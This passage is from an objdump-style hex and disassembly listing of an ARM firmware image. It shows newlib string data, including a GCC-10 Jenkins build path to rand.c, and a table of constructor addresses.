 80a147c:	0e15 080a 0e21 080a 0e29 080a 0e33 080a     ....!...)...3...
 80a148c:	0e3d 080a                                   =...

080a1490 <_ZSt7nothrow>:
 80a1490:	5200 4545 544e 6d20 6c61 6f6c 2063 7573     .REENT malloc su
 80a14a0:	6363 6565 6564 0064 6d2f 746e 772f 726f     cceeded./mnt/wor
 80a14b0:	736b 6170 6563 772f 726f 736b 6170 6563     kspace/workspace
 80a14c0:	472f 4343 312d 2d30 6970 6570 696c 656e     /GCC-10-pipeline
 80a14d0:	6a2f 6e65 696b 736e 472d 4343 312d 2d30     /jenkins-GCC-10-
 80a14e0:	6970 6570 696c 656e 342d 5f38 3032 3032     pipeline-48_2020
 80a14f0:	3131 3432 315f 3036 3136 3038 3436 2f31     1124_1606180641/
 80a1500:	7273 2f63 656e 6c77 6269 6e2f 7765 696c     src/newlib/newli
 80a1510:	2f62 696c 6362 732f 6474 696c 2f62 6172     b/libc/stdlib/ra
 80a1520:	646e 632e                                    nd.c.

080a1525 <link_const_variable_data_end>:
 80a1525:	00          	.byte	0x00
	...

080a1528 <link_constructors_location>:
 80a1528:	080a01c7 	.word	0x080a01c7
 80a152c:	080a047d 	.word	0x080a047d
 80a1530:	080a065d 	.word	0x080a065d
 80a1534:	080a066d 	.word	0x080a066d
 80a1538:	080a0689 	.word	0x080a0689
 80a153c:	080a0db1 	.word	0x080a0db1
 80a1540:	080a0e8d 	.word	0x080a0e8d
 80a1544:	080a0f21 	.word	0x080a0f21

080a1548 <link_constructors_end>:
	...
